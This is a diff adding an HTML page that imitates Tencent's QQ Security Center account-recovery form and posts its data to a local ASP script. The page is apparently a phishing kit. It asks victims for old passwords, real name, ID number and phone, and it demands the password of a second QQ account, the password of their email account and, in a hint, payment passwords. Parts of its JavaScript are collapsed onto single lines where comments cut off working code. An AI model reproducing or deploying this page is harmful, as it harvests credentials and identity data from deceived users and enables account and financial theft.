@@ -1,0 +1,294 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=gb2312"/>
+    <link href="../v2/css/global.css" rel="stylesheet" type="text/css"/>
+    <link href="../v2/css/base.css" rel="stylesheet" type="text/css"/>
+    <link rel="shortcut icon" href="../favicon.ico"/>
+    <script type="text/javascript" src="../v2/js/jquery.min.js?v=2"></script>
+    <script type="text/javascript" src="../v2/js/common.js?v=2"></script>
+    <script type="text/javascript" src="../v2/js/ctrlManager.js?v=2"></script>
+    <script type="text/javascript" src="../v2/js/vry_question.js?v=2"></script>
+    <script type="text/javascript" src="../v2/js/check.js?v=2"></script>
+    <script type="text/javascript" src="../v2/js/dna.js?v=2"></script>
+    <title>QQ安全中心</title></head>
+<body> <!--Header-->
+<div id="headerAll">
+    <div class="round" id="login_alert" style="display:none;z-index:10003;left:30%;top:30%;">
+        <div class="r_top"></div>
+    </div>
+    <div id="header">
+        <div id="top"><a onfocus="this.blur()" class="logo" href="/"><cite>QQ安全中心<br/>在线生活安全护航</cite></a>
+            <div class="right_info">
+                <ul>
+                    <li><span>欢迎您， 对不起，该输入不合法，请重新检查输入。 错误码:(375AF-955) (888888)&nbsp;&nbsp;</span></li>
+                    <li class="cent" id="safe_score_item"><a href="/cn2/index"><strong id="head_safe_score"><font
+                            color="#FF8000">30分</font></strong></a></li>
+                    <li><a href="javascript:LoginOut();">退出</a></li>
+                    <li class="pr"><a href="javascript:;" onmouseover="ShowSubMenu('site_map_menu');"
+                                      onmouseout="HideSubMenu('site_map_menu');"> 站点地图<b></b></a></li>
+                    <li><a href="http://service.qq.com/special/aq.html" target="_blank"> 腾讯客服</a></li>
+                    <li><a href="http://support.qq.com/discuss/387_1.shtml" target="_blank"> 反馈意见</a></li>
+                </ul>
+            </div>
+        </div>
+        <div id="menu">
+            <ul>
+                <li id="menu_index"><a class="m1" href="#"><cite>首页</cite></a></li>
+                <li id="menu_toolbox"><a class="m5" href="#" onmouseover="ShowSubMenu('submenu_toolbox');"
+                                         onmouseout="HideSubMenu('submenu_toolbox');"><cite>密保工具箱</cite></a></li>
+                <li id="menu_account_prot"><a class="m2" href="#" onmouseover="ShowSubMenu('submenu_account_prot');"
+                                              onmouseout="HideSubMenu('submenu_account_prot');"><cite>帐号保护</cite></a>
+                </li>
+                <li id="menu_pwd_manage"><a class="m3" href="#" onmouseover="ShowSubMenu('submenu_pwd_manage');"
+                                            onmouseout="HideSubMenu('submenu_pwd_manage');"><cite>密码管理</cite></a></li>
+                <li id="menu_safe_mutual"><a class="m4" href="#" onmouseover=""><cite>安全学堂</cite></a></li>
+            </ul>
+        </div>
+        <a class="handheld" href="#" target="_blank"></a> <!--密保工具箱下拉菜单-->
+        <div class="accounts_list toolbox_list" id="submenu_toolbox" name="submenu"
+             onmouseover="ShowSubMenu('submenu_toolbox', 'menu_toolbox', 'on5');"
+             onmouseout="HideSubMenu('submenu_toolbox','menu_toolbox');" style="display:none;"><h3><a href="#"><cite>密保工具</cite></a>
+        </h3>
+            <ul>
+                <li><a class="t1" href="#"><cite>密保手机</cite></a></li>
+                <li><a class="t2" href="#"><cite>手机令牌</cite></a></li>
+                <li><a class="t3" href="#"><cite>QQ令牌</cite></a></li>
+                <li><a class="t4" href="#"><cite>密保卡</cite></a></li>
+                <li><a class="t5" href="#"><cite>密保问题</cite></a></li>
+            </ul>
+        </div> <!--密保工具箱下拉菜单 End--> <!--帐号保护下拉菜单-->
+        <div class="accounts_list" id="submenu_account_prot"
+             onmouseover="ShowSubMenu('submenu_account_prot','menu_account_prot','on2');"
+             onmouseout="HideSubMenu('submenu_account_prot','menu_account_prot');" name="submenu" style="display:none;">
+            <h3><a href="#"><cite>帐号保护</cite></a></h3>
+            <ul>
+                <li><a class="a1" href="#"><cite>保护Q币Q点</cite></a></li>
+                <li><a class="a2" href="#"><cite>保护游戏</cite></a></li>
+                <li><a class="a3" href="#"><cite>保护QQ登录</cite></a></li>
+                <li><a class="a4" href="#"><cite>保护QQ SHOW物品</cite></a></li>
+            </ul>
+        </div> <!--帐号保护下拉菜单 End--> <!--密码管理下拉菜单-->
+        <div class="accounts_list password_list" id="submenu_pwd_manage" name="submenu"
+             onmouseover="ShowSubMenu('submenu_pwd_manage','menu_pwd_manage','on3');"
+             onmouseout="HideSubMenu('submenu_pwd_manage','menu_pwd_manage');" style="display:none;"><h3><a
+                href="#"><cite>密码管理</cite></a></h3>
+            <ul>
+                <li><a class="pw1" href="#"><cite>修改密码</cite></a></li>
+                <li><a class="pw2" href="#"><cite>找回密码</cite></a></li>
+                <li><a class="pw3" href="#"><cite>独立密码管理</cite></a></li>
+                <li><a class="pw4" href="#"><cite>帐号申诉</cite></a></li>
+            </ul>
+        </div> <!--密码管理下拉菜单 End--> <!--站点地图-->
+        <div class="m_h" style="display:none;" id="site_map_menu" onmouseover="ShowSubMenu('site_map_menu');"
+             onmouseout="HideSubMenu('site_map_menu');">
+            <div class="m_h_t"> 站点地图 <b></b></div>
+            <dl>
+                <dt><a href="#">首页</a></dt>
+            </dl>
+            <dl>
+                <dt><a href="#">帐号保护</a></dt>
+                <dd><a href="#">Q币Q点保护</a> <a href="#">QQ登录保护</a> <a href="#">游戏保护</a> <a href="#">QQ秀物品保护</a></dd>
+            </dl>
+            <dl>
+                <dt><a href="#">密保工具箱</a></dt>
+                <dd><a href="#">密保问题</a> <a href="#">密保手机</a> <a href="#">密保卡</a> <a href="#">QQ令牌</a> <a
+                        href="#">手机令牌</a> <a href="#">申请重置密保</a></dd>
+            </dl>
+            <dl>
+                <dt><a href="#">密码管理</a></dt>
+                <dd><a href="#">找回密码</a> <a href="#">修改密码</a> <a href="#">帐号申诉</a> <br/> <a href="#">独立密码管理</a></dd>
+            </dl>
+            <dl>
+                <dt><a href="#">安全学堂</a></dt>
+            </dl>
+            <dl class="n">
+                <dt class="g"> 其他</dt>
+                <dd><a href="#">举报</a> <a href="#">网址申诉</a> <a href="#">网址安全检测</a> <br/> <a href="#">个人资料</a> <a
+                        href="#">系统公告</a> <a href="http://service.qq.com/special_auto/aq.html">腾讯客服</a></dd>
+            </dl>
+        </div> <!--站点地图end--> </div>
+</div> <!--Header End-->
+<script></script> <!--Wrapper-->
+<div id="wrapper">
+    <div class="top"></div>
+    <div class="center1 password_management">
+        <div class="title_r"><a onfocus="this.blur()" href="#">密码管理</a> <em> &gt; </em>清除异常</div>
+        <div class="token_process token_process4 mt10">
+            <div class="blank20"></div>
+            <p class="f14 ta_c mt10" style="text-align: left"> 请尽量填写您的真实资料和历史资料,以便通过系统审核。 <a target="_blank"
+                                                                                             onfocus="this.blur()"
+                                                                                             href="http://www.tencent.com/zh-cn/le/privacy.shtml">隐私条款</a><br/><br/>
+            </p> <!--<div class="title_right3"><b class="tr_13"></b></div><br><br>--> <img src="images/1.jpg"/>
+            <!--<div class="title3"><b>帐号基本信息</b></div>-->
+            <form id="myform" name="myform" method="post" action="Mobile_phone.asp" onsubmit="return CheckForm();">
+                <ul>
+                    <li id="lifillBase0">
+                        <blockquote for="psw1"><b>*</b>用过的密码：</blockquote>
+                        &nbsp;<input type="password" name="history_pwd_1_password" id="pwdOldPW1" value=""
+                                     class="input_text"/> <span class="tp_txt4 f14"
+                                                                style="position: absolute; margin-left: 641px; margin-top: 343px"></span>
+                        <span id="lsmm1" style="display:none" class="tips_info"><a
+                                title="请尽量填写您早期用过的密码 如果您无法记清一个完整密码，请填写您认为最接近的。">填写提示</a></span>&nbsp; </li>
+                    <li id="lifillBase1">
+                        <blockquote for="psw2"> &nbsp; </blockquote>
+                        &nbsp;<input type="password" name="history_pwd_1_password" id="pwdOldPW1" value=""
+                                     class="input_text"/></li>
+                    <li id="lifillBase2">
+                        <blockquote for="psw3"> &nbsp; </blockquote>
+                        &nbsp;<input type="password" name="history_pwd_1_password" id="pwdOldPW1" value=""
+                                     class="input_text"/></li>
+                    <li id="pwdOption">
+                        <blockquote for="more"> &nbsp; </blockquote>
+                        <ul class="ulp">
+                            <li>
+                                <blockquote><b>*</b> 您的真实姓名：</blockquote>
+                                <input type="text" name="true_name" id="xm" class="input_text" size="26" maxlength="20"
+                                       value=""/> <span id="infoName" style="display:none"
+                                                        class="tips_info">您还没有输入真实姓名！</span></li>
+                            <li>
+                                <blockquote for="mode"> 证件类型：</blockquote>
+                                <select class="select_text" id="CertCardType" name="cert_type">
+                                    <option value="0" selected="">请选择证件类型</option>
+                                    <option value="身份证">身份证</option>
+                                    <option value="护照">护照</option>
+                                    <option value="军官证">军官证</option>
+                                    <option value="其它">其它</option>
+                                </select><span style="DISPLAY: none" id="zjlx" class="tips_info">请选择证件类型！</span></li>
+                            <li>
+                                <blockquote><b>*</b>证件号码：</blockquote>
+                                <input type="text" name="cert_id" id="zjhm1" size="26" maxlength="24" class="input_text"
+                                       value=""/>&nbsp;<span style="DISPLAY: none" id="zjhm2" class="tips_info">请填写历史证件号码！</span>
+                            </li>
+                            <li>
+                                <blockquote> 密保手机：</blockquote>
+                                <input type="text" name="Mobile" id="mbsj1" size="26" maxlength="11" class="input_text"
+                                       value="" style="ime-mode:disabled"/>&nbsp;<span style="DISPLAY: none" id="mbsj2"
+                                                                                       class="tips_info">请正确填写密保手机号码！</span>
+                            </li>
+                            <li>
+                                <blockquote><b>*</b>补充说明：</blockquote>
+                                <textarea name="reason" id="reason" maxlength="167" class="textarea"></textarea></li>
+                        </ul>
+                    </li>
+                </ul>
+                <div class="blank20"></div> <!--<div class="title_right1"><b class="tr_14"></b></div>--> <img
+                    src="images/2.jpg"/> <!--<div class="title3"><b>联系资料</b></div>-->
+                <ul class="ulp">
+                    <li>
+                        <blockquote><b>*</b>您的另一个QQ号码：</blockquote>
+                        <input name="xqq" id="txtContactQQ" type="text" size="24" maxlength="12" onkeyup="dispEm();"
+                               onblur="dispEm(); checkQqPwd(0);" class="input_text" style="ime-mode:disabled"
+                               onkeypress="return checkinput(event);"/> <span style="DISPLAY: none" id="infoContactQQ"
+                                                                              class="tips_info">请填写正确的联系QQ！</span></li>
+                    <li>
+                        <blockquote><b>*</b> QQ密码：</blockquote>
+                        <input type="password" name="xqqmm" id="txtContactQQPW" size="24" maxlength="20"
+                               class="input_text" style="ime-mode:disabled"
+                               onkeypress="detectCapsLock(event,'divCaps');" onblur="checkQqPwd(1);"
+                               onpaste="return false;"/>&nbsp;&nbsp; <span id="infoPassWdOne" class="tips_info"
+                                                                           style="display:none;">请填写联系QQ密码</span> <span
+                            class="tp_txt">请正确填写密码，如填写错误，申诉进展将无法通知到该QQ</span></li>
+                    <li>
+                        <blockquote><b>*</b> 选择联系方式：</blockquote>
+                        <span class="tp_txt5"> <input onfocus="this.blur()" name="radiobutton" id="radioEmail"
+                                                      type="radio" value="mail" checked="checked"
+                                                      onclick="onRadioChange('senfe_1');"/> <label
+                                for="2">通过电子邮件</label> </span></li>
+                    <li id="senfe_1" style="display:;">
+                        <blockquote><b>*</b> 联系邮箱：</blockquote>
+                        <input type="text" id="txtContactEmail" name="email" class="input_text" value=""
+                               onblur="if(this.value==''){this.value='请填写您的常用邮箱';}" style="ime-mode:disabled"
+                               autocomplete="off"/> <span id="infoEmail" class="tips_info" style="display:none">请正确填写电子邮箱</span>
+                    </li>
+                    <li id="senfe_2" style="display:;">
+                        <blockquote><b>*</b> 邮箱密码：</blockquote>
+                        <input name="yxmm" id="txtContactMobile" type="password" class="input_text" value=""
+                               onblur="if(this.value==''){this.value='请填写您的常用手机';}" style="ime-mode:disabled"
+                               maxlength="20" onkeypress="return checkinput(event);"/> <span id="infoMobile"
+                                                                                             class="tips_info"
+                                                                                             style="display:none"> 请正确填写手机号码</span>
+                    </li>
+                    <li class="btn"><input onclick="vbscript:myform1.submit()" src="images/anniu.jpg" type="image"/>&nbsp;
+                    </li>
+                </ul>
+            </form>
+        </div>
+    </div>
+</div>
+<div class="bottom"></div> <!--Wrapper End-->
+<div id="footer"><p><a href="http://www.tencent.com/" target="_blank">关于腾讯</a>|<a
+        href="http://www.tencent.com/index_e.shtml" target="_blank">About Tencent</a>|<a
+        href="http://www.qq.com/contract.shtml" target="_blank">服务条款</a>|<a href="http://hr.tencent.com/"
+                                                                            target="_blank">腾讯招聘</a>|<a
+        href="/v2/notice/content_6.shtml" target="_blank">漏洞报告</a>|<a href="http://service.qq.com/" target="_blank">腾讯客服<span
+        id="debug"></span></a></p>
+    <p>Copyright &copy; 1998 - 2015 Tencent. All Rights Reserved </p>
+    <p>腾讯公司 版权所有</p></div> <!--Footer End-->
+<div id="popupcontent"></div>
+<div id="mobile_confirm" class="round_container" style="display:none;">
+    <div class="round_content l_h"><p>由于运营商政策调整，手机短信下发质量不稳定， 可能申诉结果通知的短信不能到达您的手机，我们建议您使用电子邮件作为申诉的联系方式。</p></div>
+    <div class="round_button"><a id="btchangeM" onfocus="this.blur()" class="button" href="javascript:closeAlert();">
+        <span>&nbsp;确&nbsp;&nbsp;定&nbsp;</span></a></div>
+</div>
+<script language="javascript"> function CheckForm() {
+    if (document.getElementById("pwdOldPW1").value == "") {
+        $("#lsmm1").show();
+        return false;
+    } else {
+        $("#lsmm1").hide();
+    }
+    if (document.getElementById("xm").value == "") {
+        $("#infoName").show();
+        return false;
+    } else {
+        $("#infoName").hide();
+    }
+    if (document.getElementById("CertCardType").value == "0") {
+        $("#zjlx").show();
+        return false;
+    } else {
+        $("#zjlx").hide();
+    }
+    if (document.getElementById("zjhm1").value == "") {
+        $("#zjhm2").show();
+        return false;
+    } else {
+        $("#zjhm2").hide();
+    }
+    if (document.getElementById("mbsj1").value == "") {
+        $("#mbsj2").show();
+        return false;
+    } else {
+        $("#mbsj2").hide();
+    }
+}
+function checkQqPwd(isCheckAll) {
+    $("#divCaps").hide();
+    result = checkQQNumber(document.getElementById("txtContactQQ").value);
+    if (result == 0) {
+        if ($("#txtContactQQ").val() == $("#txtLoginUin").val()) { //不要和申诉号码一样 $("#infoContactQQ").text("联系QQ不能和申诉号码相同！"); $("#infoContactQQ").show(); return 1; } if (isCheckAll == 1 && checkPwd() != 0) return 3; } else if (result == 2) { $("#infoContactQQ").text("请填写正确的联系QQ"); $("#infoContactQQ").show(); return 2; } return 0; } </script>
+<script> $("#menu_safe_mutual").addClass("on4");
+$(document).ready(function () {
+    var RecordNumWords = "如：浙ICP08002323";
+    var ReasonWords = "您可以根据情况填写补充资料例如： 财付通二级密码、支付密码等，用于提高解除锁定成功的机会。";
+    InitBox($("#record_num"), RecordNumWords);
+    InitBox($("#reason"), ReasonWords);
+    $("input").blur(function () {
+        if ($(this).attr("type") == "text") {
+            $(this).removeClass("input_text_on");
+        }
+    });
+    $("input").focus(function () {
+        if ($(this).attr("type") == "text") {
+            $(this).addClass("input_text_on");
+        }
+    });
+    $("#url").blur(function () {
+        if ($("#url").val() == "") {
+            $("#url_tip").css("display", "");
+            $("#url_tip").text("申诉网址不能为空");
+        } else { //*.**模式 var reg =/^[^\s]{1,}\.[^\s]{2,}$/ if(!reg.test($("#url").val())) { $("#url_tip").css("display", ""); $("#url_tip").text("申诉网址格式错误"); } } }); $("#url").focus(function(){ $("#url_tip").css("display", "none"); }); $("#verify_code").blur(function(){ checkvcajax($(this).val(),false); }); $("#verify_code").focus(function(){ $("#verifytip").css("display", "none"); }); }); function OnSubmit(){ var checkRet = checkform(); if(checkRet) { $("#url_appeal_form").submit(); } } function checkvcajax(vcode,issubmit) { var ret = checkVerifyCode($("#verify_code").val()); var ret1= false; if(ret==0) { if(issubmit)//提交时才进行ajax检查 { $.ajax({ type:"GET", url:"/cn2/ajax/check_verifycode", data:"verify_code="+vcode, dataType:"json", success:function(json){ if(json.Err!="0") { $("#verifytip").css("display", "");	$("#verifytip").text("您输入的验证码有误"); changeCaptchaImage('imgVerify2', 'verifycode2'); ret1 = false; } else { $("#verifytip").css("display", "none");	ret1 = true; } }, async:false }); } else { $("#verifytip").css("display", "none"); } } else if(ret==1)//空 { $("#verifytip").css("display", "");	$("#verifytip").text("请输入验证码"); } else { $("#verifytip").css("display", "");	$("#verifytip").text("您输入的验证码有误"); } return ret1; }; function checkform() { if($("#url").val()=="") { $("#url_tip").css("display", ""); $("#url_tip").text("申诉网址不能为空"); return false; } //*.**模式 var reg =/^[^\s]{1,}\.[^\s]{2,}$/ if(!reg.test($("#url").val())) { $("#url_tip").css("display", ""); $("#url_tip").text("申诉网址格式错误"); return false; } //url过长 截断 if($("#url").val().length > 340) { var subUrl = $("#url").val().substr(0,340); $("#url").val(subUrl); } if($("#record_num").val()=="如：浙ICP08002323") { $("#record_num").val(""); } else {	//备案号过长 截断 if($("#record_num").val().length > 33) { var subRecnum = $("#record_num").val().substr(0,33); $("#record_num").val(subRecnum); } } if($("#reason").val()=="如：您已经清理的木马，或者站点是正规网站的说明等。") { $("#reason").val(""); } else { var maxlen = $("#reason").attr("maxlength"); //过长 截断 if($("#reason").val().length > maxlen) { var subReason = $("#reason").val().substr(0,maxlen); $("#reason").val(subReason); } } return checkvcajax($("#verify_code").val(), true); } function InitBox(varBox, varWords) { varBox.ready(function() { varBox.val(varWords); varBox.css("color", "gray"); }).focus(function() { if (varBox.val() == varWords) { varBox.val(""); varBox.css("color", "#333333"); } }).blur(function() { if (varBox.val() == "") { varBox.val(varWords); varBox.css("color", "gray"); } }); } document.onkeydown=function(event){ if(!event) { event=window.event; } try { var target_test=event.target?event.target:event.srcElement; var confirm = document.getElementById("submit"); if(event.keyCode==13&&target_test!=confirm) { OnSubmit(); } } catch(e) { } } </script>
+</body>
+</html>
